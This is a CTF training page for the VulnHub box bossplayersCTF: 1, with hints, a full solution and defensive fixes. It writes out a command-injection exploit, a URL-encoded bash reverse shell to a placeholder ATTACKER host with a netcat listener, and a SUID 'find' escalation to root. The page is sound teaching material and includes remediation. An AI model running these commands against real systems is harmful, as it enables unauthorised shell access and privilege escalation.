# Machine 6 — bossplayersCTF: 1

> **Position:** 6 of 13 · **Band 3 — Easy** (global rank **016** of 708)
> **Full writeup:** [`labs/3-016-bossplayersctf-1/README.md`](../../labs/3-016-bossplayersctf-1/README.md)

| | |
| --- | --- |
| **Machine** | bossplayersCTF: 1 |
| **Author** | Cuong Nguyen |
| **Released** | September 2019 |
| **Target** | Debian — Apache + PHP |
| **VulnHub** | [entry/bossplayersctf-1,375](https://vulnhub.com/entry/bossplayersctf-1,375/) |
| **Estimated time** | 3–4 hours |

---

## Why this machine is here

Because **OS command injection** is the most common web-to-shell bug in existence,
and this box presents it in its cleanest possible form: a single GET parameter that
runs whatever you put in it. No filters, no encoding tricks, no framework. You see
the bug, you understand the bug, you exploit the bug.

It also teaches two habits that separate careful testers from people who waste
hours: **decode every blob you find** (the page source hides a base64 chain that
names the vulnerable file), and **recognise a decoy** (`robots.txt` here is a
deliberate rabbit hole that leads nowhere).

## Learning objectives

1. Read **page source** for hidden content and decode a **multi-layer base64** chain.
2. Recognise and **refuse to chase a decoy** — and say *why* it is a decoy.
3. Understand exactly what **OS command injection** is at the source-code level.
4. Test for it with `curl` and safe probes before firing a payload.
5. **URL-encode a payload** so it survives a query string.
6. Convert command execution into a **reverse shell**, then **upgrade the TTY**.
7. Escalate via **SUID `find`** with `-exec` and `-p`.
8. Notice that a *flag* can itself be encoded (base64) rather than protected.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| Information disclosure in page source | base64 chain → hidden page **`workinginprogress.php`** |
| **Decoy / rabbit hole** | `robots.txt` → *"lol try harder bro"* — not exploitable |
| **OS command injection** | `workinginprogress.php?cmd=` → RCE as `www-data` |
| Reverse shell + TTY upgrade | `bash -i >& /dev/tcp/…`, then `python3 -c 'import pty…'` |
| **SUID shell escape** | `/usr/bin/find` → `find . -exec /bin/sh -p \; -quit` |
| Obfuscated, not protected | `/root/root.txt` is base64 of `congratulations` |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§6** (command injection) — the
  metacharacter table and the blind-exfiltration notes.
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) §1 (encoding).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md)
  **§1 and §2** — you will need both, in order.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID).

## Before you start — answer these

1. What characters cause a shell to run a *second* command, and which three would you
   try first?
2. Why must a payload in a URL query string be **URL-encoded**?
3. A base64 string decodes to another base64 string. What is your process?
4. What does `-p` add to `/bin/sh` when the binary is SUID?
5. How do you tell the difference between a decoy and a real lead, *without* reading
   the writeup?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

The homepage looks almost empty. It is not. Look at the **HTML source**, not the
rendered page — `Ctrl+U` in a browser, or `curl -s http://TARGET/ | less`.

There is an encoded blob in there. Decode it. It may need decoding more than once.

Be suspicious of `robots.txt` on this box specifically. Read it, but do not spend
twenty minutes on it.
</details>

<details>
<summary><strong>Rung 2 — what the blob says</strong></summary>

The page source contains a **three-layer base64** chain. Peel it:

```bash
echo "WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK" | base64 -d
echo "ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K" | base64 -d
echo "d29ya2luZ2lucHJvZ3Jlc3MucGhwCg==" | base64 -d
```

→ **`workinginprogress.php`**.

Meanwhile `robots.txt` decodes to *"lol try harder bro"* — a **decoy**, exactly as
the author warned. Move on.
</details>

<details>
<summary><strong>Rung 3 — the injection</strong></summary>

```bash
curl "http://TARGET/workinginprogress.php?cmd=id"
```

The page almost certainly does something like `system("ping " . $_GET['cmd'])`.
Because your input is **concatenated into a shell command without validation**, it is
executed. Confirm, then enumerate:

```bash
curl "http://TARGET/workinginprogress.php?cmd=whoami"     # www-data
curl "http://TARGET/workinginprogress.php?cmd=uname -a"
curl "http://TARGET/workinginprogress.php?cmd=ls -la /home"
```

If a plain `?cmd=` does nothing, try shell metacharacters to append your own command:
`;`, `|`, `&&`, backticks, `$( )`.
</details>

<details>
<summary><strong>Rung 4 — the shell and the escalation</strong></summary>

Start your listener **first**: `nc -lvnp 4444`. Then URL-encode the payload — `&` and
`>` are fatal in a query string:

```bash
curl "http://TARGET/workinginprogress.php?cmd=bash -c 'bash -i >%26 /dev/tcp/ATTACKER/4444 0>%261'"
```

Upgrade the TTY once it lands:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then locally:  stty raw -echo; fg
```

Then hunt SUID:

```bash
find / -perm -u=s -type f 2>/dev/null
```

`/usr/bin/find` is in the list — it should never be. Escalate:

```bash
find . -exec /bin/sh -p \; -quit
id     # uid=33(www-data) euid=0(root) egid=0(root)
```
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → 80 (Apache + PHP), 22.
2. Homepage **source** → three-layer **base64** → hidden page
   **`workinginprogress.php`**.
3. `robots.txt` is a **decoy** ("lol try harder bro"). Ignore it.
4. **OS command injection** at `workinginprogress.php?cmd=` → `id`, `whoami` →
   **`www-data`**.
5. URL-encoded **`bash` reverse shell** to `nc -lvnp 4444`; upgrade with
   `python3 -c 'import pty; pty.spawn("/bin/bash")'` + `stty raw -echo; fg`.
6. `find / -perm -u=s -type f` → **SUID `/usr/bin/find`** →
   `find . -exec /bin/sh -p \; -quit` → **euid=0**.
7. `/root/root.txt` contains **`Y29uZ3JhdHVsYXRpb25zCg==`** → `base64 -d` →
   **`congratulations`**.
</details>

## After you finish — review questions

1. Write the vulnerable PHP line you think this page contains. Then write the
   **fixed** version, using a validation function rather than escaping.
2. Why did the payload need `%26` instead of `&`? What would have happened otherwise?
3. You had three base64 layers. In a real engagement, where else do layered
   encodings show up, and what does their presence usually tell you?
4. How did you *know* `robots.txt` was a decoy rather than a lead you had not yet
   understood? Be honest — could you have told before decoding it?
5. Why is `-p` necessary on `/bin/sh` here? What happens without it?
6. `id` showed `uid=33` but `euid=0`. Which one decides what you can read?
7. The root flag was base64-encoded. Does that make it more secure? What is the
   difference between *obfuscating* a secret and *protecting* one?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| **`system("ping " . $_GET['cmd'])`** | Never pass user input to a shell. Validate as an IP (`filter_var($ip, FILTER_VALIDATE_IP)`) and use a safe API; better, do not shell out at all |
| base64 chain in page source | Anything in HTML is public. Obfuscation buys nothing — protect with authentication and access control |
| `robots.txt` treated as hiding something | `robots.txt` is public by design. Never list a path there expecting secrecy |
| No authentication on `workinginprogress.php` | A page that runs OS commands must not be reachable unauthenticated — or must not exist |
| SUID on `/usr/bin/find` | `chmod u-s`. Audit SUID against the stock set; alert on any addition |
| Outbound connections allowed from the web server | Egress-filter the DMZ. A reverse shell should not be able to reach the internet |
| No WAF / no logging on the parameter | Log and alert on shell metacharacters in query strings |

**The single biggest lesson:** *if user input reaches a shell, you have already
lost.* There is no escaping function that reliably fixes it — the fix is to not
build a shell command out of user input.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 5 — Kioptrix: Level 1](05-kioptrix-level-1-1.md) · next: [Machine 7 — Mr-Robot: 1](07-mr-robot-1.md) · full writeup: [`labs/3-016-bossplayersctf-1`](../../labs/3-016-bossplayersctf-1/README.md)._
